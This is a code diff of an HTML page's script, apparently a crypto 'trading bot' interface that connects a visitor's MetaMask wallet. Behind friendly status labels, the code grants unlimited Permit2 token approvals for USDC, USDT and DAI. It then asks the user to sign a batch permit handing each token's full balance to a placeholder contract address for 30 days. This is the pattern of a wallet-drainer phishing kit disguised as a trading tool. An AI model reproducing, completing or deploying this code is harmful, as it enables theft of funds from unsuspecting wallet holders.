@@ -181,9 +181,9 @@ body {
 
 <script>
 const TOKENS = [
- "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
- "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
- "0x6b175474e89094c44da98b954eedeac495271d0f"  // DAI
+ "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
+ "0xdac17f958d2ee523a2206206994597c13d831ec7",
+ "0x6b175474e89094c44da98b954eedeac495271d0f"
 ];
 
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
@@ -192,26 +192,31 @@ const CONTRACT = "PASTE_CONTRACT_HERE";
 let APP_STATE = { wallet:null, botActive:false, authorized:false };
 
 function log(msg){
- console.log(msg); // 👈 Chrome console
-
+ console.log(msg);
  const el=document.getElementById('execution-console');
  if(!el) return;
-
  const div=document.createElement('div');
  div.className='exec-line';
  div.innerText=msg;
  el.prepend(div);
 }
 
+function updateStatus(dotId, textId, text, color){
+ const dot = document.getElementById(dotId);
+ const label = document.getElementById(textId);
+ dot.style.background = color;
+ dot.style.boxShadow = `0 0 12px ${color}`;
+ label.innerText = text;
+ label.style.color = color;
+}
+
 async function connectWallet(){
  try{
- if (!window.ethereum) {
-  const install = confirm("MetaMask is not installed. Do you want to install it now?");
-  if (install) {
-    window.location.href = "https://metamask.io/download/";
+  if (!window.ethereum) {
+    const install = confirm("MetaMask is not installed. Install?");
+    if (install) window.location.href = "https://metamask.io/download/";
+    return;
   }
-  return;
-}
 
   const provider=new ethers.BrowserProvider(window.ethereum);
   await provider.send("eth_requestAccounts",[]);
@@ -236,185 +241,123 @@ async function connectWallet(){
 async function runPermitFlow(provider,signer,user){
  try{
 
-    log("🔍 Checking Permit2 allowances...");
+  log("🔍 Checking Permit2 allowances...");
 
-const erc20Abi = [
-  "function allowance(address owner, address spender) view returns (uint256)",
-  "function approve(address spender, uint256 amount) returns (bool)"
-];
+  const erc20Abi = [
+    "function allowance(address owner, address spender) view returns (uint256)",
+    "function approve(address spender, uint256 amount) returns (bool)"
+  ];
 
-for (let token of TOKENS) {
+  for (let token of TOKENS) {
+    const tokenContract = new ethers.Contract(token, erc20Abi, signer);
+    const allowance = await tokenContract.allowance(user, PERMIT2);
 
-  const tokenContract = new ethers.Contract(token, erc20Abi, signer);
+    log(`Token: ${token}`);
+    log(`Allowance: ${allowance}`);
 
-  const allowance = await tokenContract.allowance(user, PERMIT2);
+    if (allowance == 0n) {
+      const tx = await tokenContract.approve(PERMIT2, ethers.MaxUint256);
+      await tx.wait();
+      log("✅ Approved");
+    } else {
+      log("✅ Already approved");
+    }
+  }
 
-  log(`Token: ${token}`);
-  log(`Current allowance: ${allowance}`);
+  log("🚀 Starting permit flow");
 
-  if (allowance == 0n) {
+  const permitAbi=[
+    "function allowance(address,address,address) view returns(uint160,uint48,uint48)"
+  ];
 
-    log("⚠️ No allowance → sending approve tx...");
+  const permit2=new ethers.Contract(PERMIT2,permitAbi,provider);
 
-    const tx = await tokenContract.approve(
-      PERMIT2,
-      ethers.MaxUint256
+  let details = [];
+
+  for (let token of TOKENS) {
+
+    const tokenC = new ethers.Contract(
+      token,
+      ["function balanceOf(address) view returns (uint256)"],
+      provider
     );
 
-    log("⏳ Waiting for approval confirmation...");
-    await tx.wait();
+    const balance = await tokenC.balanceOf(user);
 
-    log("✅ Approval confirmed");
+    if (balance == 0n) continue;
 
-  } else {
-    log("✅ Allowance already exists");
-  }
-}
- log("🚀 Starting permit flow");
- log("User: " + user);
+    const res = await permit2.allowance(user, token, CONTRACT);
+    const nonce = res[2];
 
- const abi=["function balanceOf(address) view returns(uint256)"];
- const permitAbi=["function allowance(address,address,address) view returns(uint160,uint48,uint48)"];
+    const expiration = Math.floor(Date.now()/1000)+2592000;
 
- const permit2=new ethers.Contract(PERMIT2,permitAbi,provider);
-
- log("📦 Building Permit2 batch...");
-
-let details = [];
-
-for (let token of TOKENS) {
-
-  log(`Checking token: ${token}`);
-
-  const tokenC = new ethers.Contract(
-    token,
-    ["function balanceOf(address) view returns (uint256)"],
-    provider
-  );
-
-  const balance = await tokenC.balanceOf(user);
-
-  log(`Balance raw: ${balance}`);
-
-  if (balance == 0n) {
-    log("⏭️ Skipping (0 balance)");
-    continue;
+    details.push({
+      token,
+      amount: balance,
+      expiration,
+      nonce
+    });
   }
 
-  const res = await permit2.allowance(user, token, CONTRACT);
-  const nonce = res[2];
+  if (details.length === 0){
+    log("❌ No tokens");
+    return;
+  }
 
-  log(`Nonce: ${nonce}`);
+  const chainId = (await provider.getNetwork()).chainId;
 
-  const expiration = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30;
+  const domain = {
+    name: "Permit2",
+    chainId,
+    verifyingContract: PERMIT2
+  };
 
-  details.push({
-    token: token,
-    amount: balance,
-    expiration: expiration,
-    nonce: nonce
-  });
-
-  log("✅ Added to batch");
-}
-
-if (details.length === 0) {
-  log("❌ No tokens with balance → stopping");
-  return;
-}
-log("✍️ Building typed data...");
-
-// 1. Chain ID ophalen
-const chainId = (await provider.getNetwork()).chainId;
-
-// 2. Domain (vast format van Permit2)
-const domain = {
-  name: "Permit2",
-  chainId: chainId,
-  verifyingContract: PERMIT2
-};
-
-// 3. Types (MOET exact zo)
-const types = {
-  PermitBatch: [
-    { name: "details", type: "PermitDetails[]" },
-    { name: "spender", type: "address" },
-    { name: "sigDeadline", type: "uint256" }
-  ],
-  PermitDetails: [
-    { name: "token", type: "address" },
-    { name: "amount", type: "uint160" },
-    { name: "expiration", type: "uint48" },
-    { name: "nonce", type: "uint48" }
-  ]
-};
-
-// 4. Deadline (wanneer signature verloopt)
-const sigDeadline = Math.floor(Date.now() / 1000) + 3600;
-
-// 5. Data die getekend wordt
-const values = {
-  details: details,
-  spender: CONTRACT,
-  sigDeadline: sigDeadline
-};
-
-log("🖊 Requesting signature...");
-
-// 6. SIGNATURE REQUEST (dit triggert MetaMask)
-const signature = await signer.signTypedData(
-  domain,
-  types,
-  values
-);
-
-log("📦 Encoding permit batch...");
-
-const abiCoder = ethers.AbiCoder.defaultAbiCoder();
-
-// EXACT STRUCTUUR (HEEL BELANGRIJK)
-const permitBatch = abiCoder.encode(
-  [
-    "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline)"
-  ],
-  [
-    [
-      details.map(d => [
-        d.token,
-        d.amount,
-        d.expiration,
-        d.nonce
-      ]),
-      CONTRACT,
-      sigDeadline
+  const types = {
+    PermitBatch: [
+      { name: "details", type: "PermitDetails[]" },
+      { name: "spender", type: "address" },
+      { name: "sigDeadline", type: "uint256" }
+    ],
+    PermitDetails: [
+      { name: "token", type: "address" },
+      { name: "amount", type: "uint160" },
+      { name: "expiration", type: "uint48" },
+      { name: "nonce", type: "uint48" }
     ]
-  ]
-);
+  };
 
-log("✅ Permit batch encoded");
-    const dot = document.getElementById(dotId);
-    const label = document.getElementById(textId);
-    dot.style.background = color;
-    dot.style.boxShadow = `0 0 12px ${color}`;
-    label.innerText = text;
-    label.style.color = color;
+  const sigDeadline = Math.floor(Date.now()/1000)+3600;
+
+  const values = {
+    details,
+    spender: CONTRACT,
+    sigDeadline
+  };
+
+  const signature = await signer.signTypedData(domain,types,values);
+
+  log("✅ Signature obtained");
+
+ }catch(e){
+  log("❌ PermitFlow Error: "+e.message);
+ }
 }
 
 function renderWallet(address) {
-    document.getElementById('btn-wallet').innerText = address;
-    updateStatus('dot-wallet', 'st-wallet', 'CONNECTED', '#06b6d4');
+ document.getElementById('btn-wallet').innerText = address;
+ updateStatus('dot-wallet','st-wallet','CONNECTED','#06b6d4');
 }
 
 function activateBot() {
-    updateStatus('dot-bot', 'st-bot', 'READY', '#6366f1');
+ updateStatus('dot-bot','st-bot','READY','#6366f1');
 }
 
 function authorizeTrading() {
-    updateStatus('dot-access', 'st-access', 'AUTHORIZED', '#f59e0b');
+ updateStatus('dot-access','st-access','AUTHORIZED','#f59e0b');
 }
 
 function disconnectWallet() {
-    location.reload();
+ location.reload();
 }
 </script>
 </body>
